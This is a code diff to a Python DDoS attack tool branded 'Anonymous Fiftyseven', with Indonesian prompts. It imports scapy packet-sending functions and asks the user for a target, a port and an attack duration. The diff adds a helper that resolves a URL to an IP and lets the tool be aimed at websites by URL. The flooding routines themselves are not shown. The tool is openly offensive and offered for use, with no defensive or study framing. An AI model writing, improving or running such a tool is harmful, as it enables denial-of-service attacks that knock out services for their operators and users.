@@ -3,6 +3,7 @@ import logging
 import requests
 import random
 import threading
+import socket
 from scapy.all import IP, TCP, UDP, ICMP, send
 from termcolor import colored
 from tabulate import tabulate
@@ -21,6 +22,15 @@ def display_header():
     print(colored("Anonymous Fiftyseven", "cyan"))
     print(colored("="*50, "cyan"))
 
+# Konversi URL ke IP
+def get_ip(target):
+    try:
+        ip = socket.gethostbyname(target)
+        return ip
+    except socket.gaierror:
+        print(colored(f"Error: Tidak dapat mengonversi URL {target} ke IP.", "red"))
+        return None
+
 # Prompt untuk user input
 def user_input():
     print("\nMasukkan detail serangan DDoS dalam format berikut:")
@@ -32,9 +42,17 @@ def user_input():
     ]
     print(tabulate(data, headers, tablefmt="fancy_grid", colalign=("center",)))
     
-    target_ip = input(colored("\nMasukkan IP/URL target: ", "yellow"))
+    target = input(colored("\nMasukkan IP/URL target: ", "yellow"))
     target_port = int(input(colored("Masukkan port target: ", "yellow")))
     attack_duration = int(input(colored("Masukkan durasi serangan (detik): ", "yellow")))
+    
+    # Cek apakah input adalah URL atau IP, lalu konversi ke IP jika URL
+    if "http" in target or "www" in target:
+        target_ip = get_ip(target.replace("https://", "").replace("http://", "").split('/')[0])
+        if target_ip is None:
+            exit()
+    else:
+        target_ip = target
     
     return target_ip, target_port, attack_duration
 
